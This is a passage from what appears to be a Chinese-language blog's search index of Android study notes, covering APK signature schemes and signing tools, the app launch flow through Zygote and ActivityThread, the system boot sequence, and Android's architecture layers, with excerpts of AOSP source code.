字节数 描述 @0 8 这个 Block 的长度（本字段的长度不计算在内） @8 n 一组 ID-value @-24 8 这个 Bolck 的长度（和第一个字段一样值） @-16 16 魔数 “APK Sig Block 42” 具体结构如下 ID = 0x7109871a的键值对块就是保存V2签名信息的地方。开头示例如下 结尾处示例 美团团队通过自定义ID，可以用来生成渠道包https://tech.meituan.com/2017/01/13/android-apk-v2-signature-scheme.html ID = 0x7109871a的键值对块中的Value储存的是v2签名信息。 其中可以保存了一份或者多份APK签名信息（多个签名者）。 Value的内容结果如下 具体如下 示例分析。红框部分为摘要，紫框部分为证书。 2.1 摘要计算过程摘要计算只针对原始zip内容 拆分块chunk 将每个部分（即上面标注第1、3、4部分）拆分成多个大小为 1 MB大小的块chunk，最后一个块chunk可能小于1MB。之所以分块，是为了可以通过并行计算摘要以加快计算速度 计算块chunk摘要 0xa5 + chunk长度（字节数） + chunk内容 拼接起来用对应的摘要算法进行计算出每一块的摘要值； 计算整体摘要 0x5a + chunk数 + chunk摘要（按块在 APK 中的顺序）拼接起来用对应的摘要算法进行计算出整体的摘要值 2.2 防回滚绕过为了防止攻击者删除apk中的v2方案从而绕过，带 v2 签名的 APK如果还带 V1 签名，其 META-INF/*.SF 文件的主要部分中必须包含 X-Android-APK-Signed 属性。 3 V3方案APK 的 v3 签名存储为 ID 值对，ID 为 0xf05368c0。v3 方案的设计与v2 方案非常相似。它具有相同的通用格式，添加了有关支持的SDK版本和proof-of-rotation结构的信息。 简单来说APK v3就是为了Andorid9的APK 密钥轮替功能而出现的，就是在v2的基础上增加两个数据块来存储APK 密钥轮替（更新签名密钥）所需要的一些信息，所以可以看成是v2的升级。具体结构见官网说明即可。 4 V4方案APK v4是为了ADB 增量 APK 安装出现的 增量更新是基于 BSDiff 这个差量更新算法，基于两个 apk 字节码的差异，在服务端生成 patch 包，然后客户端通过同样的算法，把已安装的 apk 与 patch 包结合生成更新后的apk进行安装，以此减小 app 版本升级时的下载时间，提高更新效率。 签名方式和v2v3有所不同。 5 签名实践以下介绍jarsigner和apksigner签名工具的使用。 jarsigner是JDK提供的针对jar包签名的通用工具,位置在JDK/bin/jarsigner apksigner是Google官方提供的针对Android apk签名及验证的专用工具,位置在Android SDK/build-tools/SDK版本/apksigner 但这两种工具的签名都要使用到密钥库文件，所以顺便介绍密钥库生成。 5.1 keytool生成密钥库使用keytool生成密钥库 1keytool -genkey -keyalg RSA -keystore (指定密钥库文件名) demo.keystore 填写信息即可生成， 这个条目名字也是要用到的 或者我们可以指定条目名字 1 keytool -genkey -keyalg RSA -keystore demo1.keystore -alias test 5.2 jarsigner 签名命令 1jarsigner -keystore 密钥库名 xxx.apk 密钥别名 还有以下两个参数比较重要 -digestalg 摘要算法 -sigalg 签名算法 5.3 apksigner1apksigner sign --ks demo1.keystore --ks-key-alias test app-debug.apk apksigner默认开启v1和v2签名，可以用以下参数关闭。 --v1-signing-enabled false --v2-signing-enabled false","tags":["2024","Android","Signature"],"categories":["Study","Android"]},{"title":"安卓应用启动流程解析","path":"/2024/09/15/安卓应用启动流程解析/","content":"安卓应用启动流程目录 1 冷启动热启动 2 zygote和SystemServer 3 应用启动流程简述（记得补充） 4 从点击图标到通知Zygote 4.1 Launcher 4.2 Activity.java 4.3 Instrumentation.java 4.4 ActivityTaskManager.java 4.5 ActivityTaskManagerService.java 4.6 ActivityStarter.java 4.7 RootWindowContainer.java 4.8 回到ActivityTaskManagerService.java 4.9 ActivityManagerService.java 4.10 ProcessList.java 4.11 ZygoteProcess.java 5 Zygote创建Activity进程 5.1 ZygoteServer.java 5.2 ZygoteConnection.java 5.3 ZygoteInit.java 5.4 RuntimeInit.java 6 初始化Application实例 6.1 ActivityThread.java 7 小结 8 引用 1 冷启动热启动Activity启动过程中，一般会牵涉到应用启动的流程。应用启动又分为冷启动和热启动。 冷启动：点击桌面图标，手机系统不存在该应用进程，这时系统会重新fork一个子进程来加载Application并启动Activity，这个启动方式就是冷启动。 热启动：应用的热启动比冷启动简单得多，开销也更低。在热启动中，因为系统里已有该应用的进程，所以系统的所有工作就是将您的 Activity 带到前台。 冷启动是应用完全从0开始启动，涉及到更多的内容，所以就应用冷启动的过程展开讨论。 作者：天才木木木木链接：https://juejin.cn/post/6844904116561379341来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 2 zygote和SystemServer在进入应用启动流程前，先简单回顾一下。 zygote是在系统启动后init进程fork出来的。 zygote有一个socket，用于接受消息，当有应用申请启动的时候，会通过socket通知zygote进程，其会fork自己来创建应用进程。 在init过程中，zygote会fork出SystemServer进程。 SystemServer是由zygote进程fork出来的第一个进程，其管理着很多重要服务，比如ActivityManagerService、PackageManagerService、WindowManagerService。 3 应用启动流程简述（记得补充）从用户点击图标开始到应用创建再到第一个Activity启动 4 从点击图标到通知Zygote4.1 Launcher Launcher是Android系统启动后，Activity Manager Service (AMS)加载的第一个应用程序 Launcher又被称为桌面程序，负责Android桌面的启动和管理 用户使用的应用程序(App)都是通过Launcher来启动的 源码：&#x2F;packages&#x2F;apps&#x2F;Launcher3&#x2F;src&#x2F;com&#x2F;android&#x2F;launcher3&#x2F;Launcher.java 在Launcher中有这么一段代码，创建桌面快捷方式 其中绑定了点击事件 跟进源码：&#x2F;packages&#x2F;apps&#x2F;Launcher3&#x2F;src&#x2F;com&#x2F;android&#x2F;launcher3&#x2F;touch&#x2F;ItemClickHandler.java 对于App图标来说最终都是调用startAppShortcutOrInfoActivity方法。 而后最终会调用startActivitySafely，这里的launcher是Launcher类，所以回到Launcher.java代码。 其中的startActivitySafely会继续往上调用 继承关系：Launcher←StatefulActivity←BaseDraggingActivity ← BaseActivity←Activity startActivitySafely是在BaseActivity中实现的AppLauncher的接口方法 源码：&#x2F;packages&#x2F;apps&#x2F;Launcher3&#x2F;src&#x2F;com&#x2F;android&#x2F;launcher3&#x2F;views&#x2F;AppLauncher.java 于是乎流程进入到了Activity.java 4.2 Activity.javaActivity源码位于&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;Activity.java startActivity会调用startActivityForResult startActivityForResult 以下是通义给出的解释： 这段代码是 startActivityForResult 方法的一部分，这个方法用于启动一个 Activity，并期望从该 Activity 获取返回的结果。当目标 Activity 完成后，它会回调当前 Activity 的 onActivityResult 方法，并附带请求码（requestCode）以及结果数据。 关键点包括： intent 参数是一个 Intent 对象，它包含了要启动的目标 Activity 的信息。 requestCode 是一个整型值，当目标 Activity 结束时会通过 onActivityResult 回调传递回来。这有助于识别哪个 Activity 返回了结果。 options 参数是可选的 Bundle 对象，可以用来指定 Activity 启动的一些额外选项。 如果当前 Activity 没有父 Activity (mParent == null)，则会调用 Instrumentation 类的 execStartActivity 方法来启动新的 Activity。如果 requestCode 大于等于 0，则标记 mStartedActivity 为 true，这样可以避免在 Activity 初始化期间的闪烁现象，直到收到启动的 Activity 的结果为止。 如果当前 Activity 有一个父 Activity，则会调用父 Activity 的 startActivityFromChild 方法来启动新的 Activity，同时传递 requestCode 和 options。 4.3 Instrumentation.java源码：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;Instrumentation.java 在Instrumentation.java中execStartActivity有两种实现。execStartActivity (带 UserHandle 参数) 方法允许开发者显式地指定用于启动 Activity 的用户。而未带UserHandle参数的方法会使用默认用户启动Activity。 1234567public ActivityResult execStartActivity( Context who, IBinder contextThread, IBinder token, String resultWho, Intent intent, int requestCode, Bundle options, UserHandle user )public ActivityResult execStartActivity( Context who, IBinder contextThread, IBinder token, String target, Intent intent, int requestCode, Bundle options) 以execStartActivity (不带 UserHandle 参数) 为例，红框处为关键代码。 进入到了ActivityTaskManager中 4.4 ActivityTaskManager.java源码：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;ActivityTaskManager.java ActivityTaskManager.getService()能够获取到ActivityTaskManagerService的实例对象。 Singleton是单例模式的对象创建，也就是一个进程中只有一个该对象。 这里的ServiceManager应当对应的是当前进程的ServiceManager的单例，所以这里的调用是Launcher的ServiceManager单例。 当应用启动的时候AMS会将系统服务注册进进程的ServiceManager里。getService函数是直接从单例的数组中中获取的。 获取到的IBinder是对应Binder的引用信息，可以理解为所需要调用的（在这里为ActivityTaskManagerService）系统服务的引用信息。 而后返回系统服务所提供的服务接口。 为了能够流畅的理解启动流程，在这里不严谨地描述一下Binder机制的作用，具体的Binder机制会在后面的文章中学习。 之后的任务就交给了ActivityTaskManagerService 4.5 ActivityTaskManagerService.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;wm&#x2F;ActivityTaskManagerService.java startActivityAsUser方法通过ActivityStartController的obtainStarter方法获取了ActivityStarter对象实例，并调用ActivityStarter的execute方法 4.6 ActivityStarter.java源码位置&#x2F;frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;wm&#x2F;ActivityStarter.java 在ActivityStarter中最终会调用RootWindowContainer的resumeFocusedTasksTopActivities方法 123456789101112131415161718192021222324252627282930313233343536373839int execute() &#123; //... res = executeRequest(mRequest); //...&#125; private int executeRequest(Request request) &#123; //... // 创建ActivityRecord对象 final ActivityRecord r = new ActivityRecord.Builder(mService) .setCaller(callerApp) // ...构造参数 .build(); // 调用startActivityUnchecked方法 mLastStartActivityResult = startActivityUnchecked(...); //...&#125; private int startActivityUnchecked(...) &#123; //... // 调用startActivityInner result = startActivityInner(...); //...&#125; int startActivityInner(...) &#123; //... // 调用RootWindowContainer的resumeFocusedTasksTopActivities方法 mRootWindowContainer. resumeFocusedTasksTopActivities (...); //...&#125; 4.7 RootWindowContainer.javaRootWindowContainer是WindowManagerService的主要组成部分之一，是一个管理窗口的容器。 resumeFocusedTasksTopActivities将会调用Task和TaskFragmentPause前台程序，为新的应用程序启动做准备。 源码位置：&#x2F;frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;wm&#x2F;RootWindowContainer.java Task.java中的resumeTopActivityUncheckedLocked↓ Task.java中的resumeTopActivityInnerLocked↓ TaskFragment.java中的resumeTopActivity↓ 简单总结一下如图 startProcessAsync就将交回给ActivityTaskManagerService.java 4.8 回到ActivityTaskManagerService.java处理完窗口容器数据以后(核心工作是将前台程序Pause)，再次回到了ActivityTaskManagerService 源码地址&#x2F;frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;wm&#x2F;ActivityTaskManagerService.java 在startProcessAsync使用调用ActivityManagerInternal的startProcess方法 这里传入的mAmInternal变量是通过类搜索得到的。 ActivityManagerInternal的实现类是ActivityManagerService，所以这里就相当于给ActivityManagerService发消息。 这里使用的Handler机制是安卓中线程之间的通信方式，两种Service就是在同一进程下的不同进程。 4.9 ActivityManagerService.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;am&#x2F;ActivityManagerService.java startProcess startProcessLocked 4.10 ProcessList.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;am&#x2F;ProcessList.java 由于代码实在太长，这里就摘要一下 startProcessLocked中定义了创建Activity完成后回调的入口点 最终会调用startProcess startProcess代码主要做了以下事情 数据隔离：根据系统的配置，可能需要对应用的数据目录进行隔离处理。这涉及到文件系统的挂载操作。 选择合适的Zygote进程：根据应用的需求选择普通的Zygote进程、Webview Zygote进程或者是App Zygote进程来启动应用。这里是启动App，所以是App Zygote 启动应用进程：调用不同的方法来启动应用进程，这些方法会根据选择的Zygote类型有所不同。 异步准备存储目录：如果需要绑定挂载应用存储目录，则异步执行目录的准备工作，以避免阻塞应用启动过程。 4.11 ZygoteProcess.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;os&#x2F;ZygoteProcess.java startViaZygote全是设置参数 然后到zygoteSendArgsAndGetResult↓ 再到attemptZygoteSendArgsAndGetResult，与Zygote的通信就在这里面。 5 Zygote创建Activity进程Zygote进程是在Android系统启动过程中创建的，创建完成后会通过ZygoteServer来监听消息 5.1 ZygoteServer.javaZygoteServer监听消息的方法是runSelectLoop 源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;internal&#x2F;os&#x2F;ZygoteServer.java 在runSelectLoop中会调用ZygoteConnection的processCommand 5.2 ZygoteConnection.java这段代码是 Zygote 进程中的一个关键部分，用于处理来自客户端的命令，以启动新的应用程序进程。 源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;internal&#x2F;os&#x2F;ZygoteConnection.java **调用 ****forkAndSpecialize****或forkSimpleApps**：123pid = Zygote.forkAndSpecialize(parsedArgs.mUid, parsedArgs.mGid, ..., parsedArgs.mAppDataDir);...Runnable result = Zygote.forkSimpleApps(argBuffer, zygoteServer.getZygoteSocketFileDescriptor(), ..., parsedArgs.mNiceName); 调用 forkAndSpecialize 或 forkSimpleApps 方法来创建新的进程，并对其进行配置。 处理子进程和父进程：12345678910if (pid == 0) &#123; // 在子进程中 ... return handleChildProc (parsedArgs, childPipeFd, parsedArgs.mStartChildZygote);&#125; else &#123; // 在父进程中 ... handleParentProc(pid, serverPipeFd); return null;&#125; 根据 fork() 的返回值来区分父进程和子进程，并分别处理。 在handleParentProc中，会将创建好的进程pid发回给请求方（ActivityManagerService）。 handleChildProc中会调用ZygoteInit.``zygoteInit来初始化应用程序 5.3 ZygoteInit.javaZygote进程的初始化逻辑也是在ZygoteInit中，这里fork创建的进程也是一个Zygote进程，所以也要进行ZygoteInit。 源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;internal&#x2F;os&#x2F;ZygoteInit.java 5.4 RuntimeInit.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;internal&#x2F;os&#x2F;RuntimeInit.java 进入到findStaticMain，这个方法中，将通过反射找到之前传入的entryPoint(android.app.ActivityThread)，然后调用其main方法。 到这里Zygote进行fork子进程的流程已经结束了，接下来将交给ActivityThread进行app的实例创建。 6 初始化Application实例6.1 ActivityThread.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;ActivityThread.java attach方法如下 这里的调用栈就不深入了，接下来会调用到bindApplication方法 这里的H是ActivityThread的一个内置类 最终调用handleBindApplication，进行app实例化。 在实例化中调用的是Instrumentation的newApplication方法。 每个Activity都持有一个Instrumentation，它是由ActivityThread创建出来的一个单例。 这个类就是完成对Application和Activity初始化和生命周期的工具类，ActivityThread要创建或执行Activity生命周期方法时，都需要通过Instrumentation来进行具体的操作。 调用OnCreate函数。 至此应用启动的流程就算基本结束了。 7 小结实际上应用启动后续还需要加载第一个Activity并将其带到前台显示，但由于都是类似的流程，就不再过多赘述了。主要从应用启动流程的学习可以对Zygote和AMS有一些更深入的了解。在启动流程中遇到了Binder、Handler、Looper等安卓重要的机制，甚至还涉及到了反射，对后面这些机制的学习也有很大的帮助。","tags":["2024","Android","Application"],"categories":["Study","Android"]},{"title":"安卓系统启动流程解析","path":"/2024/09/15/安卓系统启动流程解析/","content":"安卓系统启动流程目录 1 init阶段 1.1 FirstStage 1.2 SELinux Setup 1.3 SecondStage 2 init.rc的配置 3 Zygote的启动 3.1 app_process 3.2 Zygoteinit.java 4 SystemServer 5 总结 6 引用 光看分析文章还是不够的，还是要和实践结合。 1 init阶段init 命令的入口是init&#x2F;main.cpp的main()： 12345678910111213141516171819202122232425262728293031323334353637int main(int argc, char** argv) &#123;#if __has_feature(address_sanitizer) __asan_set_error_report_callback(AsanReportCallback);#elif __has_feature(hwaddress_sanitizer) __hwasan_set_error_report_callback(AsanReportCallback);#endif// //以上部分是和编译相关的语法，满足条件时则保留后面的语句。它具体针对的是两种不同的内存检查工具：AddressSanitizer (ASan) 和 Hardware Address Sanitizer (HWAsan)。 // Boost prio which will be restored later // 提升权限，后续会恢复 setpriority(PRIO_PROCESS, 0, -20); if (!strcmp(basename(argv[0]), &quot;ueventd&quot;)) &#123; //init进程创建子进程ueventd，并将创建设备节点文件的工作托付给ueventd return ueventd_main(argc, argv); &#125; if (argc &gt; 1) &#123; // 根据不同参数执行不同阶段 if (!strcmp(argv[1], &quot;subcontext&quot;)) &#123; android::base::InitLogging(argv, &amp;android::base::KernelLogger); const BuiltinFunctionMap&amp; function_map = GetBuiltinFunctionMap(); return SubcontextMain(argc, argv, &amp;function_map); &#125; if (!strcmp(argv[1], &quot;selinux_setup&quot;)) &#123; return SetupSelinux(argv); &#125; if (!strcmp(argv[1], &quot;second_stage&quot;)) &#123; return SecondStageMain(argc, argv); &#125; &#125; // 最开始执行第一阶段 return FirstStageMain(argc, argv);&#125; init的启动阶段图 1.1 FirstStagefirstStage的源码在&#x2F;system&#x2F;core&#x2F;init&#x2F;first_stage_init.cpp 大部分是创建启动所需的各种目录，还初始化kernel log，最下面有这么一段 1234567891011121314 const char* path = &quot;/system/bin/init&quot;; const char* args[] = &#123;path, &quot;selinux_setup&quot;, nullptr&#125;; auto fd = open(&quot;/dev/kmsg&quot;, O_WRONLY | O_CLOEXEC); dup2(fd, STDOUT_FILENO); dup2(fd, STDERR_FILENO); close(fd); execv(path, const_cast&lt;char**&gt;(args)); // execv() only returns if an error happened, in which case we // panic and never fall through this conditional. PLOG(FATAL) &lt;&lt; &quot;execv(\\&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\\&quot;) failed&quot;; return 1;&#125; 这就是进入下一阶段的代码 1.2 SELinux SetupSetupSelinux主要功能就是管理selinux和相关策略。 SELinux（Security Enhanced Linux）是一种为Linux内核提供的强制访问控制（MAC, Mandatory Access Control）框架。它的设计目的是为了提高Linux系统的安全性，通过严格的权限管理机制来限制进程和用户的访问权限，从而减少系统被攻击的风险。 在SELinux Setup的结尾也有进入下一阶段的代码。 1.3 SecondStage在SecondStage中有一个LoadBootScripts的函数 init.rc是和init相关的配置文件 这里会在 LoadBootScripts() 方法中解析 init.rc 文件。关于该文件指令的含义可以参考 AOSP 中的文档：《Android Init Language》. 完成解析相关的类是 ActionManager、Parser 和 XXParser，均位于 system/core/init 目录下面。除此之外，还有 Action 和 Service 等类。它们的作用是，各种 Parser 用来解析 rc 文件中的指令。解析出的指令会被封装成 Action 和 Service 等对象。作者：开发者如是说链接：https://juejin.cn/post/6844904137268674568来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 简单摘要一下SecondStage的代码 1234567891011121314151617int SecondStageMain(int argc, char** argv) &#123; ... ActionManager&amp; am = ActionManager::GetInstance(); ... am.QueueEventTrigger(&quot;early-init&quot;); // Trigger all the boot actions to get us started. am.QueueEventTrigger(&quot;init&quot;); // Don&#x27;t mount filesystems or start core system services in charger mode. std::string bootmode = GetProperty(&quot;ro.bootmode&quot;, &quot;&quot;); if (bootmode == &quot;charger&quot;) &#123; am.QueueEventTrigger(&quot;charger&quot;); &#125; else &#123; am.QueueEventTrigger(&quot;late-init&quot;); &#125; ...&#125; 这里是构造了一个EventTrigger对象, 放到事件队列中，但是并没有触发。 直到ExecuteOneCommand才会依次触发 具体做什么，就在读取的配置文件中。源代码中位于&#x2F;system&#x2F;core&#x2F;rootdir&#x2F;init.rc 在init中会start service manager 在lateinit中会trigger zygote-start zygote-start会根据不同的配置，执行不同的操作，但最终都会执行start zygote 2 init.rc的配置上面提到在init.rc中有start zygote等启动服务的配置，那么这个start又做了什么。 根据https://chromium.googlesource.com/aosp/platform/system/core/+/refs/heads/master/init 这里的解释还是只有启动服务。 这里的 start 会被映射到 builtins 类的 do_start() 方法。该方法会调用 Service 的 start() 方法。该方法主要是调用 clone 或 fork 创建子进程，然后调用 execve 执行配置的二进制文件，另外根据之前在 rc 文件中的配置，去执行这些配置。作者：开发者如是说链接：https://juejin.cn/post/6844904137268674568来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 builtins 类system/core/init/builtins.cpp system/core/init/service.cpp servicemanager的配置位于/framework/native/cmds/servicemanager zygote的配置是根据系统类型变化的，在init.rc的开头被import 以zygote64为例，配置文件如下 主要是启动了/system/bin/app_process64 相关源码在&#x2F;frameworks&#x2F;base&#x2F;cmds&#x2F;app_process&#x2F; 3 Zygote的启动 3.1 app_process&#x2F;frameworks&#x2F;base&#x2F;cmds&#x2F;app_process&#x2F;app_main.cpp 主要是进行参数解析 还有启动ZygoteInit 这里的runtime是AndroidRuntime AndroidRuntime定义于&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;jni&#x2F;AndroidRuntime.cpp 所以这里的 start() 方法是一种 JNI （Java Native Interface）调用。这里将会调用 Java 中的静态 main() 方法继续执行。这里是在 C++ 中调用 Java 的方法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364void AndroidRuntime::start(const char* className, const Vector&lt;String8&gt;&amp; options, bool zygote)&#123; ... /* 获取环境变量 */ const char* rootDir = getenv(&quot;ANDROID_ROOT&quot;); if (rootDir == NULL) &#123; rootDir = &quot;/system&quot;; if (!hasDir(&quot;/system&quot;)) &#123; LOG_FATAL(&quot;No root directory specified, and /system does not exist.&quot;); return; &#125; setenv(&quot;ANDROID_ROOT&quot;, rootDir, 1); &#125; ... /* start the virtual machine */ /* startVM启动虚拟机 */ JniInvocation jni_invocation; jni_invocation.Init(NULL); JNIEnv* env; if (startVm(&amp;mJavaVM, &amp;env, zygote, primary_zygote) != 0) &#123; return; &#125; onVmCreated(env); ... /* * Start VM. This thread becomes the main thread of the VM, and will * not return until the VM exits. */ /* 获取类及其Main，并Call */ char* slashClassName = toSlashClassName(className != NULL ? className : &quot;&quot;); jclass startClass = env-&gt;FindClass(slashClassName); if (startClass == NULL) &#123; ALOGE(&quot;JavaVM unable to locate class &#x27;%s&#x27; &quot;, slashClassName); /* keep going */ &#125; else &#123; jmethodID startMeth = env-&gt;GetStaticMethodID(startClass, &quot;main&quot;, &quot;([Ljava/lang/String;)V&quot;); if (startMeth == NULL) &#123; ALOGE(&quot;JavaVM unable to find main() in &#x27;%s&#x27; &quot;, className); /* keep going */ &#125; else &#123; env-&gt;CallStaticVoidMethod(startClass, startMeth, strArray);#if 0 if (env-&gt;ExceptionCheck()) threadExitUncaughtException(env);#endif &#125; &#125; free(slashClassName); ALOGD(&quot;Shutting down VM &quot;); if (mJavaVM-&gt;DetachCurrentThread() != JNI_OK) ALOGW(&quot;Warning: unable to detach main thread &quot;); if (mJavaVM-&gt;DestroyJavaVM() != 0) ALOGW(&quot;Warning: VM did not shut down cleanly &quot;);&#125; 3.2 Zygoteinit.java&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;internal&#x2F;os&#x2F;ZygoteInit.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081public static void main(String[] argv) &#123; ZygoteServer zygoteServer = null; // Mark zygote start. This ensures that thread creation will throw // an error. ZygoteHooks.startZygoteNoThreadCreation(); // Zygote goes into its own process group. // 设置进程权限 try &#123; Os.setpgid(0, 0); &#125; catch (ErrnoException ex) &#123; throw new RuntimeException(&quot;Failed to setpgid(0,0)&quot;, ex); &#125; Runnable caller; try &#123; // Store now for StatsLogging later. final long startTime = SystemClock.elapsedRealtime(); final boolean isRuntimeRestarted = &quot;1&quot;.equals( SystemProperties.get(&quot;sys.boot_completed&quot;)); String bootTimeTag = Process.is64Bit() ? &quot;Zygote64Timing&quot; : &quot;Zygote32Timing&quot;; TimingsTraceLog bootTimingsTraceLog = new TimingsTraceLog(bootTimeTag, Trace.TRACE_TAG_DALVIK); bootTimingsTraceLog.traceBegin(&quot;ZygoteInit&quot;); RuntimeInit.preForkInit(); boolean startSystemServer = false; String zygoteSocketName = &quot;zygote&quot;; String abiList = null; boolean enableLazyPreload = false; // 解析参数 for (int i = 1; i &lt; argv.length; i++) &#123; if (&quot;start-system-server&quot;.equals(argv[i])) &#123; startSystemServer = true; &#125; else if (&quot;--enable-lazy-preload&quot;.equals(argv[i])) &#123; enableLazyPreload = true; &#125; else if (argv[i].startsWith(ABI_LIST_ARG)) &#123; abiList = argv[i].substring(ABI_LIST_ARG.length()); &#125; else if (argv[i].startsWith(SOCKET_NAME_ARG)) &#123; zygoteSocketName = argv[i].substring(SOCKET_NAME_ARG.length()); &#125; else &#123; throw new RuntimeException(&quot;Unknown command line argument: &quot; + argv[i]); &#125; &#125; // ... 资源预加载与日志 // 启动zygoteServer zygoteServer = new ZygoteServer(isPrimaryZygote); if (startSystemServer) &#123; // 启动SystemServer Runnable r = forkSystemServer(abiList, zygoteSocketName, zygoteServer); // &#123;@code r == null&#125; in the parent (zygote) process, and &#123;@code r != null&#125; in the // child (system_server) process. if (r != null) &#123; r.run(); return; &#125; &#125; Log.i(TAG, &quot;Accepting command socket connections&quot;); // The select loop returns early in the child process after a fork and // loops forever in the zygote. caller = zygoteServer.runSelectLoop(abiList); &#125; catch (Throwable ex) &#123; Log.e(TAG, &quot;System zygote died with fatal exception&quot;, ex); throw ex; &#125; finally &#123; if (zygoteServer != null) &#123; zygoteServer.closeServerSocket(); &#125; &#125; // ...&#125; 这里主要做了 创建ZygoteServer 对象。提供了等待 UNIX 套接字的命令，并且提供了 fork 虚拟机的方法。 资源预加载 调用 forkSystemServer() 。其中会调用 Zygote 的静态方法来 Fork 一个子进程。该方法内部又会调用 JNI 层的 nativeForkSystemServer 方法最终完成 Fork 操作。 启动 select 循环，等待连接。会等待接受命令，fork子进程，并返回子进程的 main 方法 4 SystemServer启动了SystemServer后，SystemServer还会拉起其他的系统内服务。 &#x2F;frameworks&#x2F;base&#x2F;services&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;SystemServer.java 摘要一些代码分析 12345678910111213141516171819202122232425262728293031323334353637383940414243// frameworks/base/services/java/com/android/server/SystemServer.javapublic static void main(String[] args) &#123; new SystemServer().run();&#125;// frameworks/base/services/java/com/android/server/SystemServer.javaprivate void run() &#123; TimingsTraceAndSlog t = new TimingsTraceAndSlog(); try &#123; // ... // Create the system service manager. // 启动system service manager mSystemServiceManager = new SystemServiceManager(mSystemContext); mSystemServiceManager.setStartInfo(mRuntimeRestart, mRuntimeStartElapsedTime, mRuntimeStartUptime); mDumper.addDumpable(mSystemServiceManager); // Start services. try &#123; t.traceBegin(&quot;StartServices&quot;); startBootstrapServices(t); // 启动引导服务 startCoreServices(t); // 启动核心服务 startOtherServices(t); // 启动其他服务 startApexServices(t); // 启动Apex服务 &#125; catch (Throwable ex) &#123; Slog.e(&quot;System&quot;, &quot;******************************************&quot;); Slog.e(&quot;System&quot;, &quot;************ Failure starting system services&quot;, ex); throw ex; &#125; finally &#123; t.traceEnd(); // StartServices &#125; // ... // Loop forever. Looper.loop(); throw new RuntimeException(&quot;Main thread loop unexpectedly exited&quot;);&#125; 各种启动服务的操作是通过调用 SystemServiceManager 的 startService()。 在 startBootstrapServices() 中会拉起Activity Manager Service和Package Manager Service Apex服务是指Android操作系统中的一种应用程序启动方式，它允许应用程序在设备启动时以系统服务的形式自动运行。这些服务通常包括系统应用、框架服务和系统UI等。它们在设备启动时会自动运行，并为用户提供各种基础功能和界面。startApexServices方法会遍历所有已安装的Apex服务，并调用它们的启动方法，使它们在系统启动时自动运行。该方法在系统启动过程中被调用，是Android操作系统启动过程中的一部分。 5 总结","tags":["2024","Android","System"],"categories":["Study","Android"]},{"title":"安卓架构介绍","path":"/2024/09/15/安卓架构介绍/","content":"安卓架构目录 1 Linux 内核层 2 硬件抽象层 HAL 3 Native C&#x2F;C++ 库 &amp;&amp; Android Runtime 4 Java Framework 层 5 System Apps 层 1 Linux 内核层Android 平台的基础是 Linux 内核。例如，ART 依靠 Linux 内核来执行底层功能。Linux 内核的安全机制为 Android 提供了相应的保障，也允许设备制造商为内核开发硬件驱动程序。 2 硬件抽象层 HAL硬件抽象层提供标准界面，向更高级别的 Java Framework 层显示设备硬件功能。HAL 包含多个库模块，其中每个模块都为特定类型的硬件组件实现一个界面，例如相机和蓝牙模块。当框架 API 要求访问设备硬件时，Android 系统将为该硬件组件加载库模块。 3 Native C&#x2F;C++ 库 &amp;&amp; Android Runtime每个应用都在其自己的进程中运行，都有自己的虚拟机实例。ART 通过执行 DEX 文件可在设备上运行多个虚拟机，DEX 文件是一种专为 Android 设计的字节码格式，经过优化，使用内存很少。ART 主要功能包括：AOT 和 JIT 编译，优化的 GC，以及调试相关的支持。 Native C&#x2F;C++ 库主要包括 init 孵化来的用户空间的守护进程、HAL 层以及开机动画等。启动 init 进程，是 Linux 系统的用户进程，init 进程是所有用户进程的父进程。 4 Java Framework 层Zygote 进程： 是由 init 进程通过解析 init.rc 文件后 fork 生成的，Zygote 进程主要包括： 加载 ZygoteInit 类，注册 Zygote Socket 服务端套接字 加载虚拟机 提前加载类 preloadClasses 提前加载资源 preloadResources System Server 进程： 是由 Zygote 进程 fork 而来，System Server 是 Zygote 孵化的第一个进程，System Server 负责启动和管理整个 Java Framework，包括 ActivityManager、WindowManager、PackageManager、PowerManager 等服务。 Media Server 进程： 是由 init 进程 fork 而来，负责启动和管理整个 C++ Framework，包括 AudioFlinger、Camera Service 等服务。 5 System Apps 层Zygote 进程孵化出第一个 App 进程是 Launcher，这是用户看到的桌面 App； Zygote 进程还会创建 Browser、Phone、Email 等 App 进程，每个 App 至少运行在一个进程上。 所有的 App 进程都是由 Zygote 进程 fork 